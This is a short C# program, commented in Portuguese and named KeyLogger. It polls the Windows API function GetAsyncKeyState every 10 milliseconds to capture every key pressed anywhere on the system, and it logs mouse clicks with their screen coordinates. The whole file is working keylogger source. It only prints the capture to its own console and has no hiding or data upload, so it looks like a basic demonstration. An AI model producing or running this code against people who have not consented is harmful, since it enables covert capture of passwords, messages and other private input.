// ReSharper disable HeapView.ObjectAllocation
// ReSharper disable HeapView.ObjectAllocation.Evident
// ReSharper disable HeapView.ObjectAllocation.Possible
// ReSharper disable ObjectCreationAsStatement

using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace KeyLogger
{
    /// <summary>
    /// Classe principal.
    /// </summary>
    internal static class Program
    {
        /// <summary>
        /// GetAsyncKeyState determina se uma tecla está pressionada ou não.
        /// </summary>
        /// <param name="vKey">Tecla a ser verificada.</param>
        /// <returns></returns>
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        /// <summary>
        /// Obtem a posição do cursor na tela.
        /// </summary>
        /// <param name="lpPoint">Recebe os valores de posicionamento.</param>
        /// <returns>Sucesso de retorno.</returns>
        [DllImport("user32.dll")]
        private static extern bool GetCursorPos(out Point lpPoint);

        /// <summary>
        /// Ponto de entrada da execução do programa.
        /// </summary>
        private static void Main()
        {
            new Timer(state =>
            {
                foreach (var key in (Keys[])Enum.GetValues(typeof(Keys)))
                {
                    if (GetAsyncKeyState(key) != -32767) continue;
                    Console.Write(GetKeyName(key));
                }
            }, null, TimeSpan.Zero, TimeSpan.FromMilliseconds(10));
            
            Console.ReadKey();
        }

        /// <summary>
        /// Obtem o nome ou descrição de uma tecla.
        /// </summary>
        /// <param name="key">Tecla.</param>
        /// <returns>Nome ou descrição.</returns>
        private static string GetKeyName(Keys key)
        {
            switch (key)
            {
                case Keys.Space: return " ";
                case Keys.Enter: return "\n";
                default:
                {
                    var name = $"{Enum.GetName(typeof(Keys), key)}";
                    
                    if (name.Length == 1) return name.ToLower();

                    if (name.Contains("Button"))
                    {
                        GetCursorPos(out var mouse);
                        return $"[{name} X:{mouse.X} Y:{mouse.Y}]";
                    }

                    return $"[{name}]";
                }
            }
        } 
    }
}